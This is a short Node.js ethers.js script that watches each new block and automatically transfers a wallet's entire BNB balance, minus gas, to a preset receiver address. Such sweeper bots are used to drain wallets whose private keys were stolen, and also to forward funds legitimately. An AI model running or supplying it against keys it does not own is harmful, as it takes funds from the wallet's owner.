const ethers = require("ethers");
require("dotenv").config();

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const receiverAddress = process.env.RECEIVER_ADDRESS;
const privateKey = process.env.PRIVATE_KEY;

provider.on("block", async (e) => {
    // block number
    console.log(`block number : ${e}`);

    // wallet address
    const wallet = new ethers.Wallet(privateKey, provider);
    console.log(`Wallet address: ${wallet.address}`);

    // wallet balance
    const balance = await provider.getBalance(wallet.address);
    console.log(`Wallet balance : ${ethers.formatEther(balance)}`);

    // gas price and gas limit
    const gasLimit = 21001n;
    const gasPrice = (await provider.getFeeData()).gasPrice;
    // console.log(`Gas price: ${ethers.formatUnits(gasPrice, "gwei")} GWEI`);

    // gas fees
    const gasFee = gasLimit * gasPrice * 3n;
    console.log(`Gas fees: ${ethers.formatEther(gasFee)}`);

    if (balance > gasFee) {
        console.log(`NEW ACCOUNT WITH BNB!`);
        const amount = balance - gasFee;

        try {
            const tx = await wallet.sendTransaction({
                to: receiverAddress,
                value: amount,
                gasPrice: gasPrice,
                gasLimit: gasLimit
            });
            console.log(`Success! Transferred --> ${ethers.formatEther(amount)} BNB`);
            console.log(`Transaction hash : ${tx.hash}`);
        } catch (error) {
            console.log(`Transaction error: ${error}`);
        }
    } else {
        console.log(`Not enough balance to cover gas fees`);
    }
});
